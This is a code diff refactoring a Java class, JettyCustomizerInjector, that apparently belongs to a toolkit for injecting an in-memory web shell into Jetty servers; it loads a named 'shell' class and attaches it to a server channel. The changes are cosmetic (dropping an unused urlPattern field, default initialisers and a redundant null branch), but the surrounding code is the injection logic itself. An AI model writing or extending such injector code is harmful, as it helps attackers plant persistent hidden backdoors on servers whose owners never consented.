@@ -17,11 +17,10 @@ import java.util.zip.GZIPInputStream;
 public class JettyCustomizerInjector {
 
     
-    private static boolean ok = false;
+    private static boolean ok;
 
     private static String shellClassName;
     private static String shellClass;
-    private static String urlPattern;
 
     public JettyCustomizerInjector() {
         if (ok) {
@@ -33,9 +32,7 @@ public class JettyCustomizerInjector {
         } catch (Throwable throwable) {
             
         }
-        if (channel == null) {
-            
-        } else {
+        if (channel != null) {
             try {
              
                 Object shell = getShell(channel);
@@ -48,7 +45,6 @@ public class JettyCustomizerInjector {
         ok = true;
         shellClass = null;
         shellClassName = null;
-        urlPattern = null;
     }
 
     public void inject(Object channel, Object shell) throws Exception {
@@ -91,7 +87,7 @@ public class JettyCustomizerInjector {
     @SuppressWarnings("all")
     private Object getShell(Object context) throws Exception {
         ClassLoader classLoader = context.getClass().getClassLoader();
-        Class<?> clazz = null;
+        Class<?> clazz;
         try {
             clazz = classLoader.loadClass(shellClassName);
         } catch (Exception e) {
